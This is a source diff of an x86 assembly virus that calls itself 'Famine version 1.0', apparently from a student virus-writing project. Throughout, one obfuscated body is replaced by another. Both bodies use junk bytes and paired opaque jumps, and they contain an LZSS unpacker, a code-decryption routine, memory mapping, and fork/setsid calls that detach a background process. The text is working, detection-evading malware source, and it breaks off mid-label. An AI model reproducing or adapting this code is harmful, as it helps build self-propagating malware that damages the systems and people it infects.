@@ -18,7 +18,7 @@ align 16
 _signature:
     .start: db "Famine version 1.0 (c)oded by mamaurai:xchalle - "
     .startsize: equ $-.start
-    .index: times 0x4 db 0x30
+    .index: times 4 db 0x30
     db 0x00
 align 16
 _eos:
@@ -58,828 +58,937 @@ original_virus_len: equ _eof-_start
 ; Public code.
 ;-----------------------------------------------------
 _virus:
-    jmp         ..@ePCyA8gPhg7S
-..@PWElEZkUHtOc:
-    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
-    jmp         $+5
-db 0x7c, 0xa4, 0x64
-    jmp         ..@vTUk9xlayeYK
-..@iSRRlhz1UBsL:
-    sub         rsp, _UEC_OFF_size
-    xor         rax, rax
-    jmp         $+5
-db 0x15, 0xa4, 0x57
-    jb          ..@9SQJ1KyjkO8V
-    jae         ..@9SQJ1KyjkO8V
-..@cRPB32gs8IGk:
-    jle         ..@xHu7sbPi6jEs
-    js          ..@Ppk5Nz4j1vRf
-    jns         ..@Ppk5Nz4j1vRf
-..@1wE8MCdNfI90:
-    jmp         rax
-    jmp         $+5
-db 0x41, 0x46, 0x58
-    js          ..@vaJzJxN41pfZ
-    jns         ..@vaJzJxN41pfZ
-..@ip3HBhOByeW8:
-    jz          ..@PxjBWq6kMCuT
-    call        Strncmp
-    jmp         $+4
-db 0x4f, 0x2c
-    jmp         $+4
-db 0x46, 0x17
-    jl          ..@B2IWaDo6sEhy
-    jge         ..@B2IWaDo6sEhy
-..@hHXGTkNoEJoF:
-    mov         BYTE [rsp+_LZSSD_OFF.mask], 10000000b
-    js          ..@dRIQR0vASyRx
-    jns         ..@dRIQR0vASyRx
-..@go9gBTv9zQ6b:
-    VAR         public, _start
+    jmp         ..@r0gDIqr9cRvj
+..@391RZ9YOZGZy:
+    jne         ..@oSiDRTpE5dg7
+    add         rdi, bytes
     jmp         $+3
-db 0x0d
-    jmp         ..@XsxTQdYCityh
-..@y0iYqHtYjaQ9:
-    mov         rax, SYS_EXIT
-    syscall
-    jmp         $+5
-db 0xb4, 0x3e, 0x6b
-    jmp         Strlen
-..@KUy03Jf4pziV:
-    mov         dl, BYTE [rbx]
-    mov         BYTE [rsp+_LZSSD_OFF.bits_buf], dl
-    inc         QWORD [rsp+_LZSSD_OFF.inputaddr]
+db 0x4f
     jmp         $+4
-db 0x64, 0x13
-    jmp         $+3
-db 0x9a
-    jl          ..@jU5JVSs5JeS3
-    jge         ..@jU5JVSs5JeS3
-..@M8RSpfJbGBwc:
-    mov         al, BYTE [rsp+_LZSSD_OFF.buffer+rbx]
-    jmp         ..@GwizjppHVujB
-..@FAaSt74bVols:
-    shr         BYTE [rsp+_LZSSD_OFF.mask], 1
-    sub         rcx, 1
-    jnz         ..@OZKT2TCeeBR9
-    jmp         $+3
-db 0x06
-    jmp         ..@ZNLYr316BbW5
-..@QZ0FLnnsPcut:
-    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
-    jl          ..@65r94AZYbedV
-    jge         ..@65r94AZYbedV
-..@i7vo3WcvoO3Y:
-    GGLOBAL     virus_len
-    jmp         $+5
-db 0x73, 0xb0, 0x0e
-    jmp         ..@Gq9ZXkV09EwE
-..@l6Noz4RaSym1:
-    syscall
-    add         rsp, bytes
-    js          ..@go9gBTv9zQ6b
-    jns         ..@go9gBTv9zQ6b
-..@HUIDEOhBHU6y:
-    DESTROY_MX_VAR
-    jb          ..@y0iYqHtYjaQ9
-    jae         ..@y0iYqHtYjaQ9
-..@rRtzfosmSfhz:
-%ifdef X86_64
-    mov         eax, SYS_MMAP
-    syscall
-%endif
-    jl          ..@gCpQ2yyM8ydq
-    jge         ..@gCpQ2yyM8ydq
-..@nxqDK37csq6u:
-    sub         rsp, _UEC_OFF_size
-    jl          ..@af4lzlLniBy0
-    jge         ..@af4lzlLniBy0
-..@lUnoVWO4YTDh:
-    push        r1
-    push        r2
-    jb          ..@FStrAxENfVwA
-    jae         ..@FStrAxENfVwA
-DecryptExecutableCode:
-    jmp         ..@JcnVrwXda5Py
-..@hBGgOvh4wm8W:
-    jmp         DecryptExecutableCode
-    js          ExitProgram
-    jns         ExitProgram
-..@vTUk9xlayeYK:
-    inc         DWORD [rsp+_LZSSD_OFF.index]
-    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
-    jmp         ..@Ppk5Nz4j1vRf
-    jb          ..@1J0rOiBmCOXQ
-    jae         ..@1J0rOiBmCOXQ
-..@9j5b4OzA5dhu:
-    test        rax, rax
-    jl          ..@gkndM0yTh34m
-    jge         ..@gkndM0yTh34m
-..@xQIOO4P2sWi1:
-    sub         r1, QWORD [r5]
-    jmp         $+4
-db 0x4c, 0xae
-    js          ..@ybAv1EUW6SxX
-    jns         ..@ybAv1EUW6SxX
-..@mwYuEodbbNgz:
-    call        ..@EAkqVOpo6VBj
-    mov         QWORD [rsp+_LZSSD_OFF.bits], rax
-    cmp         QWORD [rsp+_LZSSD_OFF.length], 0x00
-    jmp         $+4
-db 0x55, 0x44
-    jl          ..@LiiMd90JANlg
-    jge         ..@LiiMd90JANlg
-..@1J0rOiBmCOXQ:
-    mov         rcx, POSITION_BITS
-    js          ..@FUQB7xT8GRzd
-    jns         ..@FUQB7xT8GRzd
-..@IsUIGQAXdwE0:
-    xor         rax, rax
-    mov         rax, SYS_FORK
-    syscall
-    jmp         $+5
-db 0xaf, 0x8d, 0xd1
-    jmp         ..@9sWQekiuaCCq
-..@naFdmuZdjTRs:
-    jmp         ..@zJHLCZY9LZxK
-    js          ..@PxjBWq6kMCuT
-    jns         ..@PxjBWq6kMCuT
-..@n6RsqFsuY1rL:
-    xor         rax, rax
-    jmp         $+5
-db 0xfe, 0xb7, 0x65
-    jb          ..@4ji68uBq3Od2
-    jae         ..@4ji68uBq3Od2
-..@WZnNMW6hcX7R:
-    mov         BYTE [rbx], al
-    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
-    js          ..@CQ0Rbw3prmpY
-    jns         ..@CQ0Rbw3prmpY
-..@GwizjppHVujB:
-    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
-    je          ..@WZnNMW6hcX7R
-    jne         ..@WZnNMW6hcX7R
-ExitProgram:
-    jmp         ..@HUIDEOhBHU6y
-..@vTMo1WfC2Pyr:
-    xor         r3, r3
-    jmp         ..@HDohP8DvHWox
-..@a8kEs1wexSX9:
-    jmp         ..@OG5arZfV7JhP
-    jmp         $+4
-db 0xa8, 0xcd
-    js          ..@EAkqVOpo6VBj
-    jns         ..@EAkqVOpo6VBj
-..@prphkvozpsBb:
-%ifdef X86_32
-    push        ebp
-%endif
-    jmp         ..@JjMJrT2S0awN
-..@kBEnzlI6WPNN:
-    jnz         ..@WGBGvuwgMhUp
-    jmp         ..@n6RsqFsuY1rL
-Strlen:
-    jmp         ..@y0qFVvBRtt0h
-..@9APLYwkUCdhJ:
-    call        ..@EAkqVOpo6VBj
-    jb          ..@qWKYo5O1ZnDg
-    jae         ..@qWKYo5O1ZnDg
-..@Gw6EnTXn087i:
-%ifdef X86_32
-    mov         esi, 0x22
-%endif
-    jmp         $+3
-db 0xed
-    jb          ..@bXYVOiRXq5SK
-    jae         ..@bXYVOiRXq5SK
-..@2t7XWpRRImDK:
-    je          ..@hBGgOvh4wm8W
-    jl          ..@IsUIGQAXdwE0
-    jge         ..@IsUIGQAXdwE0
-..@UR56wCV6bVXA:
-    inc         DWORD [rsp+_LZSSD_OFF.index]
-    jb          ..@QZ0FLnnsPcut
-    jae         ..@QZ0FLnnsPcut
-..@JjMJrT2S0awN:
-%ifdef X86_32
-    xor         ebp, ebp
-    mov         eax, SYS_MMAP2
-    int         0x80
-%endif
-    jmp         ..@INu6QLOFAEus
-..@FUQB7xT8GRzd:
-    call        ..@EAkqVOpo6VBj
-    mov         rsi, rax 
-    mov         rcx, LENGTH_BITS
-    jb          ..@9APLYwkUCdhJ
-    jae         ..@9APLYwkUCdhJ
-..@jU5JVSs5JeS3:
-    dec         QWORD [rsp+_LZSSD_OFF.length]
-    jmp         $+4
-db 0x8c, 0x23
-    jl          ..@hHXGTkNoEJoF
-    jge         ..@hHXGTkNoEJoF
-..@qqtqByWtlZ9x:
-    jz          ..@cmSJDuBcrtlO
-    jmp         $+4
-db 0x23, 0x5c
-    jmp         $+5
-db 0x3c, 0x02, 0x05
-    jb          ..@EV6C7aKIbamB
-    jae         ..@EV6C7aKIbamB
-..@77nAVOBcKIFa:
-    ret
-    jb          GetEnv
-    jae         GetEnv
-..@gJdutEVoxeFM:
-    mov         rax, 0x20
-    rep         stosb
-    jmp         ..@Ppk5Nz4j1vRf
-    jmp         $+3
-db 0xd2
-    jmp         $+3
-db 0x4e
-    jmp         $+3
-db 0x30
-    jl          ..@9j5b4OzA5dhu
-    jge         ..@9j5b4OzA5dhu
-..@gCpQ2yyM8ydq:
-    mov         QWORD [rsp+_UEC_OFF.mapaddr], rax
-    js          ..@sHo9mrpbJhby
-    jns         ..@sHo9mrpbJhby
-..@9sWQekiuaCCq:
-    cmp         eax, 0x0
-    jmp         ..@aKNDFaCIz5ct
-..@aEzKUoWU1TiV:
-    or          eax, 1
-    jb          ..@FAaSt74bVols
-    jae         ..@FAaSt74bVols
-..@jQmCPB7nSAVO:
-    jz          ..@FAaSt74bVols
-    jl          ..@aEzKUoWU1TiV
-    jge         ..@aEzKUoWU1TiV
-..@L4tkelbkqSts:
-    cmp         cl, dl
-    jb          ..@cRPB32gs8IGk
-    jae         ..@cRPB32gs8IGk
-..@eI6d6lC20Ff1:
-    syscall
-    test        eax, eax
-    je          ..@h054aDmLyqi1
-    jne         ..@h054aDmLyqi1
-..@9SQJ1KyjkO8V:
+db 0xd0, 0xd1
+    js          ..@hMCkxqsFdrke
+    jns         ..@hMCkxqsFdrke
+..@tn691i0ShBFG:
     xor         r1, r1
+    jmp         $+5
+db 0xa4, 0x7d, 0xa6
+    jmp         $+3
+db 0x3c
+    js          ..@0GnnuxXr3Nt6
+    jns         ..@0GnnuxXr3Nt6
+..@T0T751gPWRVf:
+    call        ExitProgram
+    jmp         $+4
+db 0x63, 0xaf
+    jmp         $+4
+db 0x65, 0x58
+    js          ..@50gqcEaftzC8
+    jns         ..@50gqcEaftzC8
+..@PiVOeoxVxlYk:
+    test        rax, rax
+    jmp         $+4
+db 0xb5, 0x70
+    jmp         ..@8A2c9a4WJauv
+..@0GnnuxXr3Nt6:
     xor         r2, r2
     xor         r3, r3
-    jmp         $+3
-db 0xfc
     jmp         $+5
-db 0x9b, 0x32, 0x2c
-    jl          ..@58XYHNrz0tNL
-    jge         ..@58XYHNrz0tNL
-..@Ea5r42zaGAqB:
-    cmp         BYTE [r2], al
-    jmp         ..@2lrPSKEcB8JT
-..@ll6P3DNyngv4:
-    syscall
-    xor         rax, rax
-    mov         rax, SYS_FORK
-    jmp         ..@eI6d6lC20Ff1
-..@cp0RQTGGPODw:
-    xor         rax, rax
-    mov         r1, QWORD [rsp+_UEC_OFF.mapaddr]
-    jmp         $+3
-db 0xf6
-    jmp         ..@3JwzgOLIDKhb
-..@P1uTfbL9bhwG:
-    mov         rcx, 8
-    call        ..@EAkqVOpo6VBj
-    jb          ..@MTI4UMouMiN1
-    jae         ..@MTI4UMouMiN1
-..@BrGsRgzdCDi6:
-    cmp         BYTE [r1 + rax], 0x0
-    jmp         ..@2sXumVbvMrll
-..@vaJzJxN41pfZ:
-    xor         rax, rax
-    mov         eax, SYS_SETSID
-    jmp         $+4
-db 0x31, 0x87
-    js          ..@ll6P3DNyngv4
-    jns         ..@ll6P3DNyngv4
-..@2sXumVbvMrll:
-    jz          ..@WkOiv6m731lc
-    add         rax, 1
-    jmp         ..@BrGsRgzdCDi6
-    jmp         $+3
-db 0x5c
-    jb          ..@WkOiv6m731lc
-    jae         ..@WkOiv6m731lc
-..@INu6QLOFAEus:
-%ifdef X86_32
-    pop         ebp
+db 0xc7, 0x4d, 0x8d
+    jl          ..@n6FNwlNpWRyV
+    jge         ..@n6FNwlNpWRyV
+..@UlADe1h8Fyln:
+%ifdef X86_64
+    mov         eax, SYS_MMAP
 %endif
-    js          ..@7gpwY1Vskr9Z
-    jns         ..@7gpwY1Vskr9Z
-..@4ji68uBq3Od2:
+    jb          ..@JzTS1UCroSOu
+    jae         ..@JzTS1UCroSOu
+..@hheCiYhqg3pC:
+    add         rsp, _LZSSD_OFF_size
+    ret
+    jmp         $+5
+db 0xc9, 0xc5, 0x99
+..@CB36n3iMEuzJ:
+    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
+    jb          ..@EzTh4GIh8ObX
+    jae         ..@EzTh4GIh8ObX
+..@4pIVG3CqZ2ce:
+    inc         QWORD [rsp+_LZSSD_OFF.inputaddr]
+    jl          ..@G4cinLbzXXey
+    jge         ..@G4cinLbzXXey
+..@T1DnZp3ZngAk:
+    sub         rsp, _UEC_OFF_size
+    xor         rax, rax
+    js          ..@tn691i0ShBFG
+    jns         ..@tn691i0ShBFG
+..@TGGfaNGh821m:
+%ifdef X86_64
+    mov         edx, 111b
+    mov         r10, 0x22
+%endif
+    jl          ..@qKHZ5lFCKlss
+    jge         ..@qKHZ5lFCKlss
+..@v4YYpXSQGUCq:
     pop         r3
     pop         r2
-    jl          ..@cpG9o5UtoDxw
-    jge         ..@cpG9o5UtoDxw
-..@cC1ZV8YmjLIa:
-    jne         ..@iSRRlhz1UBsL
-    GGLOBAL     _packed
-    mov         m8, r5 
-    jmp         $+3
-db 0x38
-    jmp         ..@GnBqsbnjek6o
-..@jCeA7Y2elKof:
-    sub         rdi, 0x5
-    INIT_MX_VAR
-    mov         vsp, rdi
-    jmp         $+3
-db 0x96
-    jmp         ..@v3vHqrQUHaQP
-GetEnv:
-    jmp         ..@zo3nzzi66TEZ
-..@sw8zWvdpEFIk:
-    mov         m8, rax
-    je          ..@qwqFc1CQvPUO
-    jne         ..@qwqFc1CQvPUO
-..@AYkoptFzQBMX:
-    xor         r1, r1
-    jmp         $+5
-db 0xf9, 0x77, 0x06
-    jmp         $+5
-db 0x52, 0x3e, 0x98
-    jmp         $+3
-db 0x97
-    js          ..@W8LviW5CVfkw
-    jns         ..@W8LviW5CVfkw
-..@WGBGvuwgMhUp:
-    mov         al, BYTE [r1]
-    js          ..@Ea5r42zaGAqB
-    jns         ..@Ea5r42zaGAqB
-..@ybAv1EUW6SxX:
-    DESTROY_MX_VAR
-    mov         rax, r1
-    jl          ..@3ThlNfTI3jgQ
-    jge         ..@3ThlNfTI3jgQ
-..@v3vHqrQUHaQP:
-    mov         rdi, rbp
-    jmp         $+4
-db 0xf1, 0xab
-    jmp         ..@i4pNlwoU6SdC
-..@cpG9o5UtoDxw:
     pop         r1
     jmp         $+5
-db 0xac, 0xfb, 0xfe
-    jmp         $+4
-db 0x58, 0xd9
-    jmp         ..@77nAVOBcKIFa
-..@qwqFc1CQvPUO:
-    call        rax
-    js          ..@cp0RQTGGPODw
-    jns         ..@cp0RQTGGPODw
-..@xHu7sbPi6jEs:
-    mov         rbx, rsi
-    jmp         ..@Yi5Sicsdtnjl
-..@lgaoOng0Z6Im:
-    ret
-    jmp         DecryptExecutableCode
-..@CFN8hsFw20kW:
-    xor         rbx, rbx
-    jl          ..@OZKT2TCeeBR9
-    jge         ..@OZKT2TCeeBR9
-..@T1vyLOnis5kK:
-    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
-    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
-    jmp         $+4
-db 0xcc, 0xdf
-    je          ..@PWElEZkUHtOc
-    jne         ..@PWElEZkUHtOc
-..@HDohP8DvHWox:
-    xor         r4, r4
-    GGLOBAL     entrypoint
-    cmp         QWORD [r5], 0x0000000000000000
-    jmp         ..@2t7XWpRRImDK
-..@rCm2NO9ZTgQ4:
-    mov         BYTE [rsp+_LZSSD_OFF.mask], 0x0
-    mov         QWORD [rsp+_LZSSD_OFF.length], r2
+db 0x8b, 0x61, 0x07
     jmp         $+5
-db 0x25, 0xb7, 0x53
-    jmp         $+3
-db 0x1b
-    jb          ..@NxuZviPLU7Co
-    jae         ..@NxuZviPLU7Co
-..@AXwP7MmpPZDA:
-    jne         ..@i4pNlwoU6SdC
-    jmp         ..@U1caRFkQvY9t
-..@af4lzlLniBy0:
-    call        ExitProgram
-    jmp         LzssDecoder
-..@qWKYo5O1ZnDg:
-    add         rax, 1
-    mov         rdx, rax
+db 0x02, 0xd2, 0xee
+    js          ..@6GrEYEyRIWz5
+    jns         ..@6GrEYEyRIWz5
+..@BchobFBkiwIY:
     xor         rax, rax
+    jl          ..@inpU0Cy9pevQ
+    jge         ..@inpU0Cy9pevQ
+..@8A2c9a4WJauv:
+    jz          ..@LHwyxpMeR7Zx
     jmp         $+5
-db 0x71, 0xff, 0x9b
-    je          ..@kgo08ldFu2ZQ
-    jne         ..@kgo08ldFu2ZQ
-..@h054aDmLyqi1:
-    jz          ..@hBGgOvh4wm8W
-    jmp         $+5
-db 0x89, 0x8f, 0x09
-    je          ..@36xqktsOByzF
-    jne         ..@36xqktsOByzF
-..@B2IWaDo6sEhy:
-    test        rax, rax
-    jl          ..@qqtqByWtlZ9x
-    jge         ..@qqtqByWtlZ9x
-LzssDecoder:
-    jmp         ..@Xhgft2TRiXBh
-..@2lrPSKEcB8JT:
-    je          ..@axXo7L094pWV
-    sub         al, BYTE [r2]
+db 0xee, 0x5b, 0x10
     jmp         $+3
-db 0xc9
-    js          ..@Fg0mxMS9vYyx
-    jns         ..@Fg0mxMS9vYyx
-..@cmSJDuBcrtlO:
+db 0xf9
+    jmp         ..@OpPLbx4due0d
+..@kpHAguFzCBv7:
+    call        ..@76paBJYM05uU
+    jmp         $+4
+db 0x73, 0xa7
+    jmp         ..@0HlROIOD44kS
+..@qrou1xWvUf1o:
+    mov         QWORD [rsp+_LZSSD_OFF.inputaddr], r1
+    jmp         $+4
+db 0x5b, 0x8c
+    js          ..@lJiA9XcyMQsO
+    jns         ..@lJiA9XcyMQsO
+..@9SqfrsVzc4WE:
+    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
+    je          ..@h5T7G3SbaIup
+    jne         ..@h5T7G3SbaIup
+..@o21ZpaPkBK7b:
+%ifdef X86_32
+    int         0x80
+%endif
+    jb          ..@9noMeqIVjlWi
+    jae         ..@9noMeqIVjlWi
+..@OV0i95vCuDhA:
+    mov         BYTE [rsp+_LZSSD_OFF.mask], 10000000b
+    js          ..@FuyouaQBd2tQ
+    jns         ..@FuyouaQBd2tQ
+..@2B4SpDxRaXso:
     mov         rax, r2
     pop         r1
     jmp         $+5
-db 0xd3, 0x6a, 0x84
-    js          ..@lgaoOng0Z6Im
-    jns         ..@lgaoOng0Z6Im
-..@i4pNlwoU6SdC:
-    add         rdi, bytes
-    cmp         QWORD [rdi], 0x00
-    jmp         ..@AXwP7MmpPZDA
-..@Fg0mxMS9vYyx:
-    jmp         ..@4ji68uBq3Od2
-    jmp         $+3
-db 0x9c
+db 0xff, 0x35, 0xc3
     jmp         $+4
-db 0x68, 0x2a
-    jmp         $+5
-db 0xa4, 0x77, 0xa7
-    jmp         ..@axXo7L094pWV
-..@xYXxb7oOwai5:
-    xor         r3, r3
-    xor         r4, r4
-    mov         rax, SYS_WAIT4
-    js          ..@l6Noz4RaSym1
-    jns         ..@l6Noz4RaSym1
-..@WkOiv6m731lc:
-    ret
-    jb          Strncmp
-    jae         Strncmp
-..@36xqktsOByzF:
+db 0x0f, 0xc5
+    jmp         ..@RCdKhBBjMD9B
+..@NOJp2IcNXlVG:
+    mov         QWORD [rsp+_LZSSD_OFF.length], r2
+    jmp         ..@8dnFZxvIEbSN
+..@2hQZH8Wu3bgP:
     xor         rdi, rdi
-    call        ExitProgram
-    jl          ..@hBGgOvh4wm8W
-    jge         ..@hBGgOvh4wm8W
-..@zo3nzzi66TEZ:
-    push        r1
-    call        Strlen
-    mov         r3, rax
-    jmp         ..@rPB9fQkNZOe7
-..@dRIQR0vASyRx:
-    shl         eax, 1
-    mov         dl, BYTE [rsp+_LZSSD_OFF.bits_buf]
-    and         dl, BYTE [rsp+_LZSSD_OFF.mask]
+    js          ..@T0T751gPWRVf
+    jns         ..@T0T751gPWRVf
+..@CCwhRtr2Mg6C:
+    mov         dl, BYTE [rbx]
+    mov         BYTE [rsp+_LZSSD_OFF.bits_buf], dl
     jmp         $+4
-db 0xb8, 0x81
-    jmp         $+5
-db 0xc7, 0x73, 0xb9
-    jl          ..@0CzEWlT7DjXc
-    jge         ..@0CzEWlT7DjXc
-..@EAkqVOpo6VBj:
-    pop         rdi
-    xor         rax, rax
-    xor         rdx, rdx
-    jmp         $+5
-db 0x23, 0x61, 0xcb
-    jmp         ..@CFN8hsFw20kW
-..@aKNDFaCIz5ct:
-    jl          ..@nrmLBDQI3vif
-    test        eax, eax
-    jz          ..@vaJzJxN41pfZ
-    jb          ..@nrmLBDQI3vif
-    jae         ..@nrmLBDQI3vif
-..@ePCyA8gPhg7S:
-    pop         rdi
-    sub         rdi, 1
-    jmp         $+5
-db 0x3d, 0x1a, 0xc5
-    jmp         $+5
-db 0x7e, 0x86, 0xf7
-    jl          ..@jCeA7Y2elKof
-    jge         ..@jCeA7Y2elKof
-..@Ppk5Nz4j1vRf:
-    mov         rcx, 1
-    jmp         $+5
-db 0xf9, 0x53, 0x72
-    jmp         ..@mwYuEodbbNgz
-..@B8dvUmOXsv57:
-%ifdef X86_32
-    mov         edx, 111b
-%endif
-    jb          ..@Gw6EnTXn087i
-    jae         ..@Gw6EnTXn087i
-..@rPB9fQkNZOe7:
-    mov         r4, m4
-    jmp         $+4
-db 0x69, 0x9c
-    jmp         $+3
-db 0xdc
-    jl          ..@zJHLCZY9LZxK
-    jge         ..@zJHLCZY9LZxK
-..@K90Jiwe0HW5g:
-%ifdef X86_64
-    mov         r10, 0x22
-    mov         r8, 0xffffffffffffffff
-%endif
-    jmp         $+5
-db 0x8d, 0x31, 0x08
-    jl          ..@rRtzfosmSfhz
-    jge         ..@rRtzfosmSfhz
-..@kgo08ldFu2ZQ:
-    xor         rcx, rcx
-    xor         rdi, rdi
-    jl          ..@xHu7sbPi6jEs
-    jge         ..@xHu7sbPi6jEs
-..@MTI4UMouMiN1:
-    xor         rdi, rdi
-    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
-    jmp         ..@Ii8tN47spgS1
-..@JcnVrwXda5Py:
-    GGLOBAL     virus_len
-    jb          ..@s5xPCF9AgW0z
-    jae         ..@s5xPCF9AgW0z
-..@W8LviW5CVfkw:
-    xor         r2, r2
-    jmp         $+5
-db 0xbe, 0x80, 0xb5
-    je          ..@vTMo1WfC2Pyr
-    jne         ..@vTMo1WfC2Pyr
-..@OG5arZfV7JhP:
-    add         rsp, _LZSSD_OFF_size
-    jmp         $+4
-db 0x63, 0x2d
-    jmp         ..@tOc1jq0765hw
-..@pStBAm2hANF1:
-    ret
-    jmp         ..@OG5arZfV7JhP
-..@y0qFVvBRtt0h:
-    xor         rax, rax
-    js          ..@BrGsRgzdCDi6
-    jns         ..@BrGsRgzdCDi6
-..@Xhgft2TRiXBh:
-    sub         rsp, _LZSSD_OFF_size
-    jmp         $+3
-db 0xff
-    js          ..@Fo4DTWUyDBe7
-    jns         ..@Fo4DTWUyDBe7
-..@65r94AZYbedV:
-    add         ecx, 1
-    jmp         $+4
-db 0x34, 0xc2
-    jb          ..@L4tkelbkqSts
-    jae         ..@L4tkelbkqSts
-..@FStrAxENfVwA:
-    push        r3
-    xor         rax, rax
-    jmp         $+5
-db 0xc9, 0xdd, 0x4b
-    jmp         $+5
-db 0x04, 0xd6, 0xf3
-    je          ..@WGBGvuwgMhUp
-    jne         ..@WGBGvuwgMhUp
-..@U1caRFkQvY9t:
-    add         rdi, bytes
-    mov         m4, rdi
-    jmp         ..@AYkoptFzQBMX
-..@tOc1jq0765hw:
-    ret
-    jmp         $+4
-db 0xe0, 0xd8
-Strncmp:
-    jmp         ..@lUnoVWO4YTDh
-..@PxjBWq6kMCuT:
-    xor         r2, r2
-    js          ..@cmSJDuBcrtlO
-    jns         ..@cmSJDuBcrtlO
-..@XsxTQdYCityh:
-    mov         r1, r5
-    VAR         public, entrypoint
-    jmp         ..@xQIOO4P2sWi1
-..@NxuZviPLU7Co:
-    mov         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-LOOKAHEAD_LENGTH
-    js          ..@fRL2m3pbGZdb
-    jns         ..@fRL2m3pbGZdb
-..@0CzEWlT7DjXc:
-    test        dl, dl
-    jmp         $+5
-db 0xb5, 0x3d, 0xac
-    js          ..@jQmCPB7nSAVO
-    jns         ..@jQmCPB7nSAVO
-..@4J9xp5uP2PB7:
+db 0x97, 0x70
+    jl          ..@4pIVG3CqZ2ce
+    jge         ..@4pIVG3CqZ2ce
+..@Gx2w50H4oqUB:
+    jz          ..@2B4SpDxRaXso
+    js          ..@fVslIyb9VKg1
+    jns         ..@fVslIyb9VKg1
+..@5Fiadffoclzw:
+    add         r1, 1
     add         r2, 1
     dec         r3
     jmp         $+5
-db 0x66, 0x12, 0xfd
-    jmp         $+4
-db 0x04, 0x4b
-    jmp         ..@kBEnzlI6WPNN
-..@LiiMd90JANlg:
-    jg          ..@9j5b4OzA5dhu
-    jmp         ..@a8kEs1wexSX9
-..@Ii8tN47spgS1:
-    mov         BYTE [rbx], al
-    js          ..@T1vyLOnis5kK
-    jns         ..@T1vyLOnis5kK
-..@Fo4DTWUyDBe7:
-    mov         QWORD [rsp+_LZSSD_OFF.inputaddr], r1
-    jb          ..@QmitKaGXMLkn
-    jae         ..@QmitKaGXMLkn
-..@EV6C7aKIbamB:
-    add         r4, bytes
-    js          ..@naFdmuZdjTRs
-    jns         ..@naFdmuZdjTRs
-..@9eFv2ITG8ape:
-    call        LzssDecoder
+db 0x1e, 0x13, 0xbc
+    jl          ..@7xZ6mvbr8IPl
+    jge         ..@7xZ6mvbr8IPl
+..@snFNG3x2MNBs:
+    ret
+    jb          Strncmp
+    jae         Strncmp
+..@qKHZ5lFCKlss:
+%ifdef X86_64
+    mov         r8, 0xffffffffffffffff
+%endif
+    jmp         ..@UlADe1h8Fyln
+..@1ZlGUmYQVjez:
+    add         rsp, bytes
     jmp         $+5
-db 0x5d, 0x31, 0x53
-    je          ..@LLeSXag6RfDz
-    jne         ..@LLeSXag6RfDz
-..@Zcp2UWDy5yLQ:
-    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
-    mov         BYTE [rsp+_LZSSD_OFF.buffer+rdi], al
-    jmp         ..@UR56wCV6bVXA
-..@gkndM0yTh34m:
-    jz          ..@1J0rOiBmCOXQ
-    jmp         $+5
-db 0xd9, 0x95, 0x77
+db 0x11, 0xde, 0xbb
+    jb          ..@3U8gkervwhEF
+    jae         ..@3U8gkervwhEF
+..@9Jahm1UJvrN2:
+    jle         ..@Wnj8i95tyGAp
     jmp         $+3
-db 0x60
-    je          ..@P1uTfbL9bhwG
-    jne         ..@P1uTfbL9bhwG
-..@3JwzgOLIDKhb:
-    mov         r2, original_virus_len-non_packed_len
-    mov         rax, SYS_MUNMAP
+db 0x58
+    jmp         $+4
+db 0xb7, 0x6f
+    js          ..@9FqE0GdV8UAO
+    jns         ..@9FqE0GdV8UAO
+..@UcS7fJW0mstk:
+    jz          ..@uk6OXB2SBpFN
+    or          eax, 1
+    js          ..@uk6OXB2SBpFN
+    jns         ..@uk6OXB2SBpFN
+..@EcyoeV2LaVTo:
+    add         ecx, 1
+    jb          ..@VuthG0gSaeGF
+    jae         ..@VuthG0gSaeGF
+..@LHwyxpMeR7Zx:
+    mov         rcx, POSITION_BITS
+    js          ..@kpHAguFzCBv7
+    jns         ..@kpHAguFzCBv7
+..@fx7mOsK4d7Yb:
     syscall
     jmp         $+3
-db 0x50
-    jmp         $+5
-db 0x1d, 0xbc, 0xb2
-    js          ..@nxqDK37csq6u
-    jns         ..@nxqDK37csq6u
-..@aq19aAhGGc2J:
-    mov         r3, QWORD [rsp+_UEC_OFF.mapaddr]
-    je          ..@9eFv2ITG8ape
-    jne         ..@9eFv2ITG8ape
-..@nrmLBDQI3vif:
-    mov         r1, rax
+db 0x41
+    jmp         ..@JXk69gW0leam
+..@ePZRE3ctYUfo:
     xor         r2, r2
-    je          ..@xYXxb7oOwai5
-    jne         ..@xYXxb7oOwai5
-..@CQ0Rbw3prmpY:
-    xor         rdi, rdi
-    jb          ..@Zcp2UWDy5yLQ
-    jae         ..@Zcp2UWDy5yLQ
-..@s5xPCF9AgW0z:
-    cmp         DWORD [r5], 0x00000000
-    jmp         ..@cC1ZV8YmjLIa
-..@Gq9ZXkV09EwE:
-    xor         r2, r2
-    mov         r2d, DWORD [r5]
-    sub         r2, non_packed_len
-    jmp         $+3
-db 0x17
-    jl          ..@aq19aAhGGc2J
-    jge         ..@aq19aAhGGc2J
-..@ZNLYr316BbW5:
-    push        rdi
-    jb          ..@pStBAm2hANF1
-    jae         ..@pStBAm2hANF1
-..@Yi5Sicsdtnjl:
-    add         bx, cx
-    and         bx, WINDOW_LENGTH-1
-    jmp         ..@M8RSpfJbGBwc
-..@58XYHNrz0tNL:
+    jmp         ..@2B4SpDxRaXso
+..@n6FNwlNpWRyV:
 %ifdef X86_32
     mov         ecx, original_virus_len-non_packed_len
 %endif
-    jmp         $+4
-db 0x92, 0x8d
-    js          ..@B8dvUmOXsv57
-    jns         ..@B8dvUmOXsv57
-..@sHo9mrpbJhby:
-    GGLOBAL     _packed
-    mov         r1, r5
-    jmp         $+5
-db 0xc1, 0xf9, 0xc7
+    js          ..@nQBpl4tW88s4
+    jns         ..@nQBpl4tW88s4
+..@8kaXbdaHQBaN:
+    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
+    js          ..@MZpJFOx61Vst
+    jns         ..@MZpJFOx61Vst
+..@KwDMdNiNVTqc:
